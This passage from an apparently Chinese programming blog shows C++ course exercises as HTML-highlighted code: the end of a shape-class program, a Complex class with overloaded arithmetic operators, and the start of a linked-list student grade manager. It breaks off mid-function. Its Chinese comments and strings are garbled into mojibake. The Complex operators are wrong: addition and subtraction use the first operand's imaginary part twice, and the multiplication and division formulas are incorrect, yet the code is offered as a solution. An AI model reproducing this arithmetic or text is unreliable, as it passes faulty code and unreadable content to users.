class="keyword">if</span>(type==<span class="string">"Circle"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line">gp = <span class="keyword">new</span> Circle(value);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"triangle"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'tall"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;tall;</span><br><span class="line">gp = <span class="keyword">new</span> triangle(value,tall);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®ä¸‰-è¿ç®—ç¬¦é‡è½½"><a href="#é¢˜ç›®ä¸‰-è¿ç®—ç¬¦é‡è½½" class="headerlink" title="é¢˜ç›®ä¸‰ è¿ç®—ç¬¦é‡è½½"></a>é¢˜ç›®ä¸‰ è¿ç®—ç¬¦é‡è½½</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">class <span class="built_in">Complex</span>&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="built_in">Complex</span>(double r=<span class="number">0.0</span>,double i=<span class="number">0.0</span>);</span><br><span class="line">void <span class="keyword">print</span>();</span><br><span class="line">friend <span class="built_in">Complex</span> operator+ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator- (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator* (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">friend <span class="built_in">Complex</span> operator/ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b);</span><br><span class="line">private:</span><br><span class="line">double <span class="built_in">real</span>;</span><br><span class="line">double <span class="built_in">imag</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Complex</span>::<span class="built_in">Complex</span>(double r,double i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">real</span> = r;</span><br><span class="line"><span class="built_in">imag</span> = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator+ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> + b.<span class="built_in">real</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">imag</span> + a.<span class="built_in">imag</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator- (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> - b.<span class="built_in">real</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">imag</span> - a.<span class="built_in">imag</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator* (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">temp.<span class="built_in">real</span> = a.<span class="built_in">real</span> * b.<span class="built_in">real</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>;</span><br><span class="line">temp.<span class="built_in">imag</span> = a.<span class="built_in">real</span> * b.<span class="built_in">imag</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Complex</span> operator/ (<span class="built_in">Complex</span>&amp; a,<span class="built_in">Complex</span>&amp; b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> temp;</span><br><span class="line">double t;</span><br><span class="line">t = <span class="number">1</span>/(b.<span class="built_in">real</span> * b.<span class="built_in">real</span> + b.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>);</span><br><span class="line">temp.<span class="built_in">real</span> = (a.<span class="built_in">real</span> * b.<span class="built_in">real</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">imag</span>)*t;</span><br><span class="line">temp.<span class="built_in">imag</span> = (b.<span class="built_in">real</span> * b.<span class="built_in">imag</span> + a.<span class="built_in">imag</span> * b.<span class="built_in">real</span>)*t;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">void <span class="built_in">Complex</span>::<span class="keyword">print</span>()</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">imag</span>&gt;<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;<span class="string">"+"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">imag</span>!=<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;<span class="built_in">imag</span>&lt;&lt;'i'&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Complex</span> A1(<span class="number">2.3</span>,<span class="number">4.6</span>),A2(<span class="number">3.6</span>,<span class="number">2.8</span>),A3,A4,A5,A6;</span><br><span class="line">A3 = A1 + A2;</span><br><span class="line">A4 = A1 - A2;</span><br><span class="line">A5 = A1 * A2;</span><br><span class="line">A6 = A1 / A2;</span><br><span class="line">A1.<span class="keyword">print</span>();</span><br><span class="line">A2.<span class="keyword">print</span>();</span><br><span class="line">A3.<span class="keyword">print</span>();</span><br><span class="line">A4.<span class="keyword">print</span>();</span><br><span class="line">A5.<span class="keyword">print</span>();</span><br><span class="line">A6.<span class="keyword">print</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ"><a href="#å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ" class="headerlink" title="å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ"></a>å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num;                                   <span class="comment">//æ€»å­¦ç”Ÿäººæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">studentMessage</span>;</span> <span class="comment">// å‹å‘˜å‡½æ•°</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> ID;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> score[<span class="number">5</span>];                       <span class="comment">//1-4ä»£è¡¨mathã€Englishã€OPPå’Œæ€»æˆç»©  ï¼Œ0å·å•å…ƒç©ºå‡º</span></span><br><span class="line">    student * next;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    student();</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getName</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> name;&#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getID</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> ID;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getMath</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">1</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getEnglesh</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">2</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getOPP</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">3</span>];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">gettotol</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> score[<span class="number">4</span>];&#125;</span><br><span class="line">    <span class="function">student* <span class="title">getNext</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> next;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">analyse</span><span class="params">(<span class="keyword">int</span> ,student * )</span></span>; <span class="comment">//åˆ†ææˆç»©</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;                          <span class="comment">//æ‰“å°æˆç»©</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">()</span></span>;                          <span class="comment">//äº¤æ¢å¯¹è±¡å’Œå¯¹è±¡-&gt;nextçš„ä¿¡æ¯</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">student::student()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¯·è¾“å…¥å­¦ç”Ÿå­¦å· : "</span>;<span class="built_in">cin</span>&gt;&gt;ID;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¯·è¾“å…¥å­¦ç”Ÿå§“å : "</span>;<span class="built_in">cin</span>&gt;&gt;name;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¯·è¾“å…¥å­¦ç”Ÿçš„æ•°å­¦ã€è‹±è¯­å’ŒOPPæˆç»© : "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    <span class="keyword">while</span>(a&lt;<span class="number">0</span>||a&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¾“å…¥æˆç»©æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;<span class="number">0</span>||b&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¾“å…¥æˆç»©æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;c;</span><br><span class="line">    <span class="keyword">while</span>(c&lt;<span class="number">0</span>||c&gt;<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¾“å…¥æˆç»©æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;c;        </span><br><span class="line">    &#125;</span><br><span class="line">    score[<span class="number">1</span>]=a;</span><br><span class="line">    score[<span class="number">2</span>]=b;</span><br><span class="line">    score[<span class="number">3</span>]=c;</span><br><span class="line">    score[<span class="number">4</span>]=a+b+c;</span><br><span class="line">    next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::analyse(<span class="keyword">int</span> a,student * first)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> you=<span class="number">0</span>,liang=<span class="number">0</span>,zhong=<span class="number">0</span>,jige=<span class="number">0</span>,bujige=<span class="number">0</span>;</span><br><span class="line">    student * t=first;</span><br><span class="line">    <span class="keyword">double</span> average=<span class="number">0</span>;                   <span class="comment">//å¹³å‡åˆ†</span></span><br><span class="line">    <span class="keyword">while</span>(t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="keyword">int</span>(t-&gt;score[a]/<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">switch</span>(b)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:you++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:liang++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:zhong++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:jige++;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:bujige++;</span><br><span class="line">        &#125;</span><br><span class="line">        average+=t-&gt;score[a];</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    average=average/num;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" è€ƒç”Ÿæ€»äººæ•° : "</span>&lt;&lt;num&lt;&lt;<span class="string">"        å¹³å‡åˆ† : "</span>&lt;&lt;average&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n ä¼˜     è‰¯      ä¸­     åŠæ ¼    ä¸åŠæ ¼  "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;you&lt;&lt;<span class="string">" \t"</span>&lt;&lt;liang&lt;&lt;<span class="string">" \t"</span>&lt;&lt;zhong&lt;&lt;<span class="string">"\t"</span>&lt;&lt;jige&lt;&lt;<span class="string">"\t"</span>&lt;&lt;bujige&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::display()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;ID&lt;&lt;<span class="string">"     "</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;name&lt;&lt;<span class="string">"      "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">3</span>)&lt;&lt;score[i]&lt;&lt;<span class="string">"      "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> student::swap()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="built_in">string</span> na,id;</span><br><span class="line">    <span class="keyword">double</span> sco[<span class="number">5</span>];</span><br><span class="line">    na=name;name=next-&gt;name;next-&gt;name=na;</span><br><span class="line">    id=ID;ID=next-&gt;ID;next-&gt;ID=id;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)</span><br><span class="line">    &#123;                                            </span><br><span class="line">        sco[j]=score[j];</span><br><span class="line">        score[j]=next-&gt;score[j];    </span><br><span class="line">        next-&gt;score[j]=sco[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">studentMessage</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    student * first;</span><br><span class="line">    student * last;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    studentMessage();</span><br><span class="line">    <span class="function">student* <span class="title">getFirst</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> first;&#125;</span><br><span class="line">    <span class="function">student* <span class="title">getLast</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> last;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getNum</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> num;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;                             <span class="comment">//å‘è¡¨ä¸­å¢åŠ å­¦ç”Ÿæˆç»©è®°å½•</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">()</span></span>;                          <span class="comment">//åœ¨è¡¨ä¸­æŸ¥æ‰¾å­¦ç”Ÿæˆç»©è®°å½•</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span>;                             <span class="comment">//åœ¨è¡¨ä¸­åˆ é™¤å­¦ç”Ÿæˆç»©è®°å½•</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showOne</span><span class="params">()</span></span>;                         <span class="comment">//åˆ†æä¸€é—¨è¯¾çš„æˆç»©</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">showAll</span><span class="params">()</span></span>;                         <span class="comment">//è¾“å‡ºæ‰€æœ‰åŒå­¦æ‰€æœ‰ç§‘ç›®çš„æˆç»©</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span></span>;                            <span class="comment">//æŒ‰ä¸€é—¨è¯¾æˆç»©æˆ–æ€»æˆç»©æ’åº</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;                           <span class="comment">//æ¸…ç©ºæ‰€æœ‰ä¿¡æ¯å¹¶é€€å‡ºç³»ç»Ÿ</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">studentMessage::studentMessage()</span><br><span class="line">&#123;</span><br><span class="line">    first=<span class="literal">NULL</span>;</span><br><span class="line">    last=<span class="literal">NULL</span>;</span><br><span class="line">    num=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::add()</span><br><span class="line">&#123;</span><br><span class="line">    student * t =<span class="keyword">new</span> student;</span><br><span class="line">    student *p = first;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;ID==t-&gt;ID)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nå­¦å·è¾“å…¥é”™è¯¯æˆ–è¯¥å­¦ç”Ÿæˆç»©å·²ç»å­˜åœ¨ï¼(å¦‚éœ€ä¿®æ”¹ï¼Œè¯·å…ˆåˆ é™¤å†é‡æ–°å½•å…¥)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">if</span>(first==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        first=last=t;</span><br><span 